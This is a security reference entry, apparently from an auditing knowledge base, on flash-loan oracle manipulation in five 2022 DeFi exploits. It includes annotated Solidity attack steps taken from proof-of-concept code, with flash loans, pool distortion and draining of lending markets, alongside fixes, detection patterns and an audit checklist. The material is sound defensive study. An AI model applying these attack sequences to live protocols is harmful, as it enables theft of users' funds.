---
# Core Classification
protocol: "lending, stablecoin, defi"
chain: "ethereum, bsc, fantom, arbitrum"
category: "oracle_manipulation"
vulnerability_type: "flash_loan_price_manipulation"

# Pattern Identity (Required)
root_cause_family: missing_validation
pattern_key: flash_loan_price_manipulation | price_oracle | economic_exploit | fund_loss

# Interaction Scope
interaction_scope: cross_protocol

# Attack Vector Details
attack_type: "economic_exploit"
affected_component: "price_oracle, lending_market, stablecoin_mint_redeem"

# Technical Primitives
primitives:
  - "flash_loan"
  - "amm_reserve_oracle"
  - "curve_virtual_price"
  - "lp_token_price"
  - "vault_exchange_rate"
  - "spot_price_oracle"
  - "donate_inflate"
  - "collateral_pricing"

# Impact Classification
severity: "critical"
impact: "fund_loss"
exploitability: 0.85
financial_impact: "critical"

# Grep / Hunt-Card Seeds (Required)
code_keywords:
  - "bond"
  - "mint"
  - "stake"
  - "borrow"
  - "donate"
  - "plvGLP"
  - "redeem"
  - "deposit"
  - "exchange"
  - "getPrice"
  - "overborrow"
  - "getEGDPrice"
  - "getReserves"
  - "calculateAll"
  - "addCollateral"
path_keys:
  - "amm_reserve_based_price_oracle_direct_lp_pool_manipulation"
  - "curve_lp_virtual_price_oracle_manipulation"
  - "solidly_lp_oracle_weak_signature_validation"
  - "vault_share_price_inflation_via_donation"

# Context Tags
tags:
  - "defi"
  - "flash_loan"
  - "oracle_manipulation"
  - "price_manipulation"
  - "lending"
  - "compound_fork"
  - "amm_price"
  - "curve"
  - "solidly"
  - "vault_rate"
  - "collateral"
  - "overborrow"

# Version Info
language: "solidity"
version: ">=0.6.0"
---

## References

| Tag | Source | Path / URL |
|-----|--------|------------|
| [EGD-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-08/EGD_Finance_exp.sol` |
| [INV-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-06/InverseFinance_exp.sol` |
| [ELPH-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-04/Elephant_Money_exp.sol` |
| [DEUS-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-04/deus_exp.sol` |
| [LODE-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-12/Lodestar_exp.sol` |

---

# Flash Loan Oracle Manipulation Patterns (2022)
## Overview

Flash loan-based oracle manipulation is the single most common DeFi attack vector in 2022, responsible for **$46.7M+** across at least 5 major exploits. The universal pattern: a protocol uses **real-time on-chain state** — AMM pool reserves, Curve LP virtual_price, vault share price, or Solidly LP pricing — as a price oracle for lending, minting, or collateral valuation. An attacker obtains a massive flash loan, distorts the on-chain state within the same transaction, interacts with the protocol at the manipulated price, then reverses the distortion and repays. Unlike 2021 patterns (direct reserve reads), 2022 saw increasingly sophisticated targets: Curve Tricrypto virtual_price, Plutus vault donation, Solidly LP oracle + weak cryptographic signatures, and multi-step mint/redeem arbitrage.

---


### Agent Quick View

| Field | Value |
|-------|-------|
| Root Cause | `missing_validation` |
| Pattern Key | `flash_loan_price_manipulation | price_oracle | economic_exploit | fund_loss` |
| Severity | CRITICAL |
| Impact | fund_loss |
| Interaction Scope | `cross_protocol` |
| Chain(s) | ethereum, bsc, fantom, arbitrum |


## 1. AMM Reserve-Based Price Oracle — Direct LP Pool Manipulation

> **pathShape**: `callback-reentrant`

### Root Cause

This vulnerability exists because the price calculation function reads **real-time AMM pool reserve balances** to derive token prices. When an attacker flash-loans the majority of one side of the pool, the reserve ratio shifts drastically, producing a manipulated price that the protocol uses for reward calculations, lending decisions, or minting.

### Attack Scenario

1. Attacker flash-borrows the majority of the quote token from the target LP pool
2. During the flash callback, the pool's reserve ratio is distorted
3. Protocol's `getPrice()` reads the distorted reserves → returns manipulated price
4. Attacker interacts with the protocol at the manipulated price (claim rewards, mint, borrow)
5. Flash loan repays, price returns to normal
6. Attacker profits from the price difference

### Vulnerable Pattern Examples

**Example 1: EGD Finance — LP Reserve-Based getEGDPrice() ($36K, August 2022)** [Approx Vulnerability: HIGH] `@audit` [EGD-POC]

```solidity
// ❌ VULNERABLE: Price oracle reads real-time pool reserves
// getEGDPrice() function derives price from EGD/USDT PancakeSwap LP reserves

interface IEGD_Finance {
    function bond(address invitor) external;
    function stake(uint256 amount) external;
    function calculateAll(address addr) external view returns (uint256);
    function claimAllReward() external;
    function getEGDPrice() external view returns (uint256);
    // @audit getEGDPrice() reads USDT balance of EGD_USDT_LPPool
    // When attacker drains USDT from pool, EGD price drops to near-zero
    // Reward calculation: rewards = staked * (currentPrice / stakePrice)
    // With near-zero currentPrice denominator, rewards become enormous
}

// Attack Step 1: Pre-stage — stake 100 USDT to become eligible
IEGD_Finance(EGD_Finance).stake(100 * 1e18);

// Attack Step 2: Flash loan 99.99999925% of USDT from the LP pool
uint256 borrow2 = IERC20(usdt).balanceOf(address(EGD_USDT_LPPool))
    * 9_999_999_925 / 10_000_000_000;
EGD_USDT_LPPool.swap(0, borrow2, address(this), "00");
// @audit Pool now has almost 0 USDT → getEGDPrice() returns near-zero

// Attack Step 3: Inside flash callback — claim inflated rewards
IEGD_Finance(EGD_Finance).claimAllReward();
// @audit Rewards calculation uses manipulated price → massive EGD payout

// Attack Step 4: Swap inflated EGD → USDT, repay flash loan
```

**Example 2: Elephant Money — AMM Spot Price in Mint/Redeem ($11.2M, April 2022)** [Approx Vulnerability: CRITICAL] `@audit` [ELPH-POC]

```solidity
// ❌ VULNERABLE: Stablecoin mint() and redeem() use AMM spot price
// Trunk stablecoin minting reads ELEPHANT price from PancakeSwap pool

interface IElephantMoney {
    function mint(uint256 amount) external;   // Uses AMM ELEPHANT price
    function redeem(uint256 amount) external;  // Uses AMM ELEPHANT price
}

// Attack Step 1: Flash loan 100,000 WBNB + 90,000,000 BUSD
IPancakePair(BUSDT_WBNB_Pair).swap(0, 100_000 ether, address(this), "0x00");
// Nested flash loan for 90M BUSD

// Attack Step 2: Buy massive ELEPHANT to pump AMM price
address[] memory path_1 = new address[](2);
path_1[0] = address(WBNB);
path_1[1] = address(ELEPHANT);
router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 100_000 ether}(
    0, path_1, address(this), block.timestamp
);
// @audit ELEPHANT price now inflated on PancakeSwap

// Attack Step 3: Mint Trunk at inflated ELEPHANT price
IElephantMoney(not_verified).mint(90_000_000 ether);
// @audit Gets MORE Trunk than fair value because ELEPHANT appears expensive

// Attack Step 4: Dump ELEPHANT to crash price back
address[] memory path_2 = new address[](2);
path_2[0] = address(ELEPHANT);
path_2[1] = address(WBNB);
router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
    balance_elephant, 0, path_2, address(this), block.timestamp
);

// Attack Step 5: Redeem Trunk for BUSD at original rate
IElephantMoney(not_verified).redeem(balance_Trunk);
// @audit Recovers more BUSD than initially spent on minting
// Profit: ~$11.2M after repaying flash loans
```

---

## 2. Curve LP / Virtual Price Oracle Manipulation

> **pathShape**: `atomic`

### Root Cause

This vulnerability exists because lending protocols use Curve pool's **internal state** (virtual_price, LP token value) as a price oracle for collateral. By performing a massive swap or liquidity operation on the Curve pool via flash loan, the attacker distorts the pool's internal accounting. The oracle reads this distorted state and reports an inflated collateral value, enabling oversized borrows.

### Attack Scenario

1. Flash loan massive amounts of assets that Curve pools accept
2. Perform a large swap on the Curve Tricrypto or other pool to distort virtual_price
3. The lending protocol's oracle reads the distorted Curve state → inflated collateral value
4. Borrow maximum amount against the inflated collateral
5. Reverse the Curve swap to recover flash-loaned assets
6. Repay flash loan, keep borrowed funds as profit

### Vulnerable Pattern Examples

**Example 3: Inverse Finance — Curve Tricrypto Virtual Price Manipulation ($15.6M, June 2022)** [Approx Vulnerability: CRITICAL] `@audit` [INV-POC]

```solidity
// ❌ VULNERABLE: Oracle derives price from Curve Tricrypto pool state
// YVCrv3CryptoFeed reads virtual_price from the pool during large swap

// The oracle contract that reads Curve state:
IAggregator YVCrv3CryptoFeed = IAggregator(0xE8b3bC58774857732C6C1147BFc9B9e5Fb6F427C);
// @audit Reads from Curve Tricrypto pool — manipulable via large swaps

// Attack Step 1: Flash loan 27,000 WBTC from Aave
address[] memory assets = new address[](1);
assets[0] = address(WBTC);
uint256[] memory amounts = new uint256[](1);
amounts[0] = 2_700_000_000_000;  // 27,000 WBTC
aaveLendingPool.flashLoan(address(this), assets, amounts, modes,
    address(this), "0x", 0);

// Attack Step 2: Deposit into Curve → Yearn → Inverse as collateral
curveVyper_contract.add_liquidity(amounts2, 0);
yvCurve3Crypto.deposit(5_375_596_969_399_930_881_565, address(this));
anYvCrv3CryptoInverse.mint(4_906_754_677_503_974_414_310);
Unitroller.enterMarkets(toEnter);
// @audit Collateral deposited — value will be read from YVCrv3CryptoFeed

// Attack Step 3: Massive swap to manipulate Curve oracle
// Dump 26,775 WBTC into Tricrypto pool
curveRegistry.exchange(
    address(curveVyper_contract),
    address(WBTC),
    address(usdt),
    2_677_500_000_000,  // 26,775 WBTC
    0,
    address(this)
);
// @audit Oracle now reads inflated value for yvCurve3Crypto collateral

// Attack Step 4: Borrow against inflated collateral
InverseFinanceDola.borrow(10_133_949_192_393_802_606_886_848);
// @audit Borrows ~10.1M DOLA — far more than fair collateral value

// Attack Step 5: Reverse swap to recover WBTC
curveRegistry.exchange(
    address(curveVyper_contract),
    address(usdt),
    address(WBTC),
    usdt.balanceOf(address(this)),
    0,
    address(this)
);
// Convert DOLA → 3CRV → USDT → WBTC, repay Aave flash loan
```

---

## 3. Solidly LP Oracle + Weak Signature Validation

> **pathShape**: `linear-multistep`

### Root Cause

This vulnerability exists because the lending protocol uses a Solidly/Solidex LP token as collateral with an oracle that reads LP value from manipulable on-chain state, AND the oracle's off-chain signature verification (Schnorr) is weak or bypassable. The attacker manipulates the LP price via a massive swap on the Solidly pool, then borrows against the inflated collateral with a forged oracle signature.

### Vulnerable Pattern Examples

**Example 4: DEUS DAO — Solidly LP Oracle + Schnorr Signature Bypass ($13.4M, April 2022)** [Approx Vulnerability: CRITICAL] `@audit` [DEUS-POC]

```solidity
// ❌ VULNERABLE: Lending uses Solidly LP with manipulable oracle
// DeiLenderSolidex accepts deposit tokens as collateral
// Oracle reads from Solidly LP pool state — manipulable via swap
// Schnorr signature validation is weak/bypassable

interface IDeiLenderSolidex {
    function addCollateral(address to, uint256 amount) external;
    function borrow(
        address to, uint256 amount, uint256 maxBorrow,
        uint256 deadline, bytes memory repID,
        SchnorrSign[] memory sigs  // @audit Weak Schnorr validation
    ) external;
}

interface ILpDepositor {
    function deposit(address pool, uint256 amount) external;
}

// Attack Step 1: Fund with 150M USDC (via cross-chain bridge exploit)
usdc.Swapin(txHash, address(this), 150_000_000 * 10 ** 6);

// Attack Step 2: Build LP position as collateral
sspv4.buyDei(1_000_000 * 10 ** 6);  // Buy 1M DEI
router.addLiquidity(address(dei), address(usdc), true, /* ... */);
LpDepositor.deposit(address(lpToken), balance_of_LpToken);
DeiLenderSolidex.addCollateral(address(this), balance_of_DepositToken);
// @audit Collateral deposited — value from Solidly LP oracle

// Attack Step 3: Massive swap to manipulate oracle
router.swapExactTokensForTokensSimple(
    143_200_000_000_000,  // 143.2 BILLION USDC
    0,
    address(usdc),
    address(dei),
    true,
    address(this),
    block.timestamp
);
// @audit Solidly LP oracle now reports inflated DEI/USDC LP value

// Attack Step 4: Borrow with forged Schnorr signature
SchnorrSign memory sig = SchnorrSign(/* forged parameters */);
DeiLenderSolidex.borrow(
    address(this),
    17_246_885_701_212_305_622_476_302,  // ~17.2M DEI
    20_923_953_265_992_870_251_804_289,
    1_651_113_560,
    repID,
    sigs
);
// @audit Borrows 17.2M DEI against inflated collateral

// Attack Step 5: Swap DEI → USDC for profit
router.swapExactTokensForTokensSimple(
    12_000_000_000_000_000_000_000_000,  // 12M DEI
    0, address(dei), address(usdc), true,
    address(this), block.timestamp
);
```

---

## 4. Vault Share Price Inflation via Donation

> **pathShape**: `atomic`

### Root Cause

This vulnerability exists because lending protocols accept vault tokens (plvGLP, yearn vault shares) as collateral and price them based on the vault's exchange rate (totalAssets / totalShares). An attacker can inflate the vault's exchange rate by directly donating assets to the vault (via a `donate()` function or direct transfer), making their collateral appear far more valuable without actually depositing through the normal flow.

### Vulnerable Pattern Examples

**Example 5: Lodestar Finance — plvGLP Donation-Based Inflation ($6.5M, December 2022)** [Approx Vulnerability: CRITICAL] `@audit` [LODE-POC]

```solidity
// ❌ VULNERABLE: Lending market prices plvGLP by vault exchange rate
// GlpDepositor.donate() inflates plvGLP price without minting new shares
// Lending oracle reads inflated exchange rate → overvalued collateral

interface GlpDepositor {
    function donate(uint256 _amount) external;
    // @audit Adds GLP to vault WITHOUT minting new plvGLP shares
    // Exchange rate = totalGLP / totalPlvGLP → inflates when GLP donated
    function redeem(uint256 amount) external;
}

interface GMXReward {
    function mintAndStakeGlpETH(uint256 _minUsdg, uint256 _minGlp)
        external payable returns (uint256);
    function mintAndStakeGlp(address _token, uint256 _amount,
        uint256 _minUsdg, uint256 _minGlp) external returns (uint256);
}

// Attack Step 1: Massive flash loans (~$70M total)
// Aave: 17.29M USDC + 9500 WETH + 406K DAI
// Radiant: 14.435M USDC
// UniV3: 5460 WETH + 9.37M USDC
// SushiSwap: 10M USDC
AaveFlash.flashLoan(address(this), assets, amounts, modes,
    address(0), "", 0);

// Attack Step 2: Deposit USDC as collateral base
USDC.approve(address(IUSDC), USDC.balanceOf(address(this)));
IUSDC.mint(USDC.balanceOf(address(this)));  // Mint lUSDC
unitroller.enterMarkets(cTokens);

// Attack Step 3: Loop borrow-redeposit plvGLP 16 times
uint256 PlvGlpTokenAmount = PlvGlpToken.balanceOf(address(lplvGLP));
for (uint256 i = 0; i < 16; i++) {
    lplvGLP.borrow(PlvGlpTokenAmount);  // Borrow all plvGLP
    lplvGLP.mint(PlvGlpTokenAmount);    // Re-deposit as collateral
    // @audit Accumulates massive plvGLP position
}
lplvGLP.borrow(PlvGlpTokenAmount);  // Final borrow

// Attack Step 4: Convert remaining assets to GLP and DONATE
uint256 glpAmount = ETHglpAmount + FRAXglpAmount + USDCglpAmount
    + DAIglpAmount + USDTglpAmount;
sGLP.approve(address(depositor), glpAmount);
depositor.donate(glpAmount);
// @audit KEY: This inflates plvGLP exchange rate!
// totalGLP increases but totalPlvGLP stays the same
// All plvGLP collateral in Lodestar is now "worth more"

// Attack Step 5: With inflated collateral, borrow EVERYTHING
IUSDC.borrow(USDC.balanceOf(address(IUSDC)));    // All USDC
IETH.borrow(address(IETH).balance);               // All ETH
IMIM.borrow(MIM.balanceOf(address(IMIM)));        // All MIM
IUSDT.borrow(USDT.balanceOf(address(IUSDT)));    // All USDT
IFRAX.borrow(FRAX.balanceOf(address(IFRAX)));    // All FRAX
IDAI.borrow(DAI.balanceOf(address(IDAI)));        // All DAI
IWBTC.borrow(WBTC.balanceOf(address(IWBTC)));    // All WBTC
// @audit ALL lending pools completely drained
// Repay flash loans, keep ~$6.5M profit
```

---

## Impact Analysis

### Technical Impact
- Complete drainage of lending pool liquidity across ALL supported assets
- Stablecoin depegging through inflated minting
- Protocol insolvency — bad debt exceeds reserves
- One-transaction atomic exploit with zero upfront capital

### Business Impact
- **Total losses 2022:** $46.7M+ (Inverse $15.6M, DEUS $13.4M, Elephant $11.2M, Lodestar $6.5M, EGD $36K)
- Compound fork protocols using on-chain oracles are systematically vulnerable
- Any lending market that accepts LP tokens or vault shares as collateral is high-risk
- Multi-chain impact: BSC, Ethereum, Fantom, Arbitrum all affected

### Affected Scenarios
- Lending protocols using AMM reserve-based price feeds
- Protocols reading Curve virtual_price or LP token price during large operations
- Lending markets accepting vault tokens (plvGLP, yvTokens) as collateral with donation-inflatable exchange rates
- Stablecoins with mint/redeem functions that use spot AMM prices
- Any protocol where flash loan can distort an intermediate price and exploit it same-block

---

## Secure Implementation

**Fix 1: Time-Weighted Average Price (TWAP) Oracle**
```solidity
// ✅ SECURE: Use TWAP instead of spot price
contract SecurePriceOracle {
    IUniswapV3Pool public pool;
    uint32 public constant TWAP_PERIOD = 30 minutes;

    function getPrice() external view returns (uint256) {
        (int24 arithmeticMeanTick, ) = OracleLibrary.consult(
            address(pool),
            TWAP_PERIOD  // Average over 30 minutes
        );
        uint256 price = OracleLibrary.getQuoteAtTick(
            arithmeticMeanTick,
            1e18,
            token0,
            token1
        );
        return price;
        // Flash loans cannot manipulate a 30-minute TWAP
    }
}
```

**Fix 2: Chainlink Oracle with Staleness Check**
```solidity
// ✅ SECURE: Use Chainlink instead of on-chain AMM state
contract SecureLendingOracle {
    AggregatorV3Interface public priceFeed;
    uint256 public constant MAX_STALENESS = 1 hours;

    function getAssetPrice(address asset) external view returns (uint256) {
        (, int256 price, , uint256 updatedAt, ) = priceFeed.latestRoundData();
        require(price > 0, "Invalid price");
        require(block.timestamp - updatedAt <= MAX_STALENESS, "Stale oracle");
        return uint256(price);
        // Chainlink prices are off-chain aggregated — immune to flash loan manipulation
    }
}
```

**Fix 3: Donation-Resistant Vault Pricing**
```solidity
// ✅ SECURE: Cap exchange rate change per block
contract SecureVaultOracle {
    uint256 public lastExchangeRate;
    uint256 public lastUpdateBlock;
    uint256 public constant MAX_RATE_CHANGE = 1e16; // 1% max per block

    function getExchangeRate() external view returns (uint256) {
        uint256 currentRate = vault.totalAssets() * 1e18 / vault.totalSupply();

        // Cap the rate change to prevent donation attacks
        if (block.number > lastUpdateBlock) {
            uint256 maxRate = lastExchangeRate * (1e18 + MAX_RATE_CHANGE) / 1e18;
            uint256 minRate = lastExchangeRate * (1e18 - MAX_RATE_CHANGE) / 1e18;
            return currentRate > maxRate ? maxRate :
                   currentRate < minRate ? minRate : currentRate;
        }
        return lastExchangeRate;
    }
}
```

---

## Detection Patterns

### Code Patterns to Look For
```
- `getReserves()` used for price calculation → AMM reserve oracle
- `virtual_price` or `get_virtual_price()` in oracle logic → Curve LP oracle
- `totalAssets() / totalSupply()` in collateral pricing → vault rate oracle
- `donate()` or direct asset transfer to vault → donation inflation vector
- `balanceOf(pool)` in price function → spot balance oracle
- Flash loan + swap + borrow/mint in same transaction → oracle manipulation
- `exchange()` on Curve pools before borrow operations → Curve oracle manipulation
- LP token as collateral in lending market without TWAP → vulnerable to flash manipulation
- Schnorr/threshold signature in oracle → verify signature scheme robustness
```

### Audit Checklist
- [ ] Does the protocol use on-chain AMM reserves for price discovery?
- [ ] Can a flash loan significantly move the price used by the protocol?
- [ ] Are vault tokens (plvGLP, yvTokens) accepted as collateral?
- [ ] Can the vault's exchange rate be inflated via donation or direct transfer?
- [ ] Is Curve virtual_price or LP token value used in oracle calculations?
- [ ] Is there an oracle delay or TWAP to prevent same-block manipulation?
- [ ] Are oracle signatures cryptographically robust (not weak Schnorr)?
- [ ] Can a single large swap move the oracle price by >5%?
- [ ] Is flash loan protection in place (e.g., borrowing in same block blocked)?

---

## Real-World Examples

### Known Exploits
- **Inverse Finance** — Curve Tricrypto virtual_price oracle via 26,775 WBTC swap, Ethereum — June 2022 — $15.6M
  - Root cause: Oracle read Curve pool state manipulated by massive flash-loaned swap
- **DEUS DAO** — Solidly LP oracle + weak Schnorr signatures, Fantom — April 2022 — $13.4M
  - Root cause: Solidly LP price manipulated + cryptographic oracle bypass
- **Elephant Money** — PancakeSwap AMM spot price in mint/redeem, BSC — April 2022 — $11.2M
  - Root cause: Stablecoin mint/redeem used real-time AMM ELEPHANT price
- **Lodestar Finance** — plvGLP exchange rate inflated via donate(), Arbitrum — December 2022 — $6.5M
  - Root cause: GlpDepositor.donate() inflated vault exchange rate without minting shares
- **EGD Finance** — LP reserve-based getEGDPrice(), BSC — August 2022 — $36K
  - Root cause: Price derived from USDT balance of LP pool, drained by flash loan

---

## Prevention Guidelines

### Development Best Practices
1. NEVER use real-time AMM reserves as a price oracle for lending/minting/borrowing
2. Use Chainlink, Pyth, or other off-chain oracle aggregators for price feeds
3. Implement TWAP with minimum 30-minute window for any on-chain price derivation
4. For vault collateral: cap exchange rate changes per block, add donation detection
5. Add same-block borrow protection: prevent borrow in same block as deposit
6. Use multi-source oracle with deviation checks (Chainlink + TWAP + spot with median)
7. Audit all collateral pricing paths for flash-loan manipulability
8. Disable vault donations or account for them separately in price calculations

### Testing Requirements
- Unit tests for: flash loan + oracle manipulation attack on each collateral type
- Integration tests for: full attack flow (flash loan → manipulate → borrow → repay)
- Fuzzing targets: oracle price functions with extreme pool states
- Invariant tests: borrowed value should never exceed fair-market collateral value in same block

---

## Keywords for Search

> `flash loan oracle manipulation`, `AMM reserve oracle`, `getReserves price`, `Curve virtual_price`, `LP token oracle`, `vault exchange rate manipulation`, `donate inflate`, `plvGLP`, `Tricrypto oracle`, `Solidly LP price`, `spot price oracle`, `EGD Finance`, `Inverse Finance`, `Elephant Money`, `DEUS DAO`, `Lodestar Finance`, `flash loan collateral`, `overborrow`, `manipulable oracle`, `on-chain price feed`, `reserve-based pricing`, `lending oracle`, `compound fork oracle`

---

## Related Vulnerabilities

- `DB/oracle/price-manipulation/defihacklabs-price-manipulation-patterns.md` — 2021 flash loan price manipulation patterns
- `DB/general/vault-inflation-attack/defihacklabs-vault-inflation-patterns.md` — ERC4626/CompoundV2 vault inflation
- `DB/general/flash-loan-attacks/` — Flash loan attack patterns
- `DB/oracle/` — Oracle vulnerability patterns (Chainlink, Pyth)
